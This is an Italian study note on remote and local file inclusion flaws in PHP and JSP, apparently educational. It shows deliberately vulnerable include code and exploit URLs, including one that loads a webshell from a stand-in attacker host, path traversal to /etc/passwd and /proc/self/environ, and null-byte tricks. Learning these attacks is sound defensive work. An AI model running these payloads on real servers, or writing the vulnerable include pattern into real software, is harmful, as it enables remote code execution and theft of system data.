## File inclusion

- https://en.wikipedia.org/wiki/Remote_File_Inclusion
- https://www.owasp.org/index.php/Top_10_2007-A3

Questa vulnerabilità si ha quando un'applicazione crea un path per codice eseguibile usando una variabile che è sotto il controllo dell'attaccante,
in un modo che gli permette di controllare quale file viene eseguito.
Sfruttando una vulnerabilità di questo tipo permette una RCE sul server che esegue l'appicazione vulnerabile.

- Remote File Inclusion

	L'applicazione scarica ed esegue un file remoto.

	Exploit:

		http://localhost/vulnerabilities/fi/?page=http://172.17.0.3/rfi.php

- Local File Inclusion

	Come il RFI ma il file sfruttato è presente sul server.

	Exploit:

		http://localhost/vulnerabilities/fi/?page=/etc/passwd

**PHP**

Funzioni che includono un file per l'esecuzione sono `include` e `require`.
La direttiva `allow_url_fopen` o `allow_url_include` (in `php.ini`) abilitata permette di usare una URL per scaricare un file remoto ed eseguirlo.
Anche se disabilitato è raggirabile con compressione (`zlib://`) o stream audio (`ogg://`) che non ispezionano il flag URL PHP interno.
Si possono sfruttare anche i wrapper PHP come `php://input`.

Codice vulnerabile:

```
<form method="get">
   <select name="language">
      <option value="english">English</option>
      <option value="french">French</option>
      ...
   </select>
   <input type="submit">
</form>

<?php
   if ( isset( $_GET['language'] ) ) {
      include( $_GET['language'] . '.php' );
   }
?>
```

Exploit:

```
/vulnerable.php?language=http://evil.example.com/webshell.txt?
/vulnerable.php?language=C:\\ftp\\upload\\exploit
/vulnerable.php?language=C:\\notes.txt%00
/vulnerable.php?language=../../../../../etc/passwd%00
/vulnerable.php?language=../../../../../proc/self/environ%00
```

**JSP**

Anche le JSP sono vulnerabili a Null byte injection (`%00`)

Codice vulnerabile:

```
<%
   String p = request.getParameter("p");
   @include file="<%="includes/" + p +".jsp"%>"
%>
```

Exploit:

```
/vulnerable.jsp?p=../../../../var/log/access.log%00
```

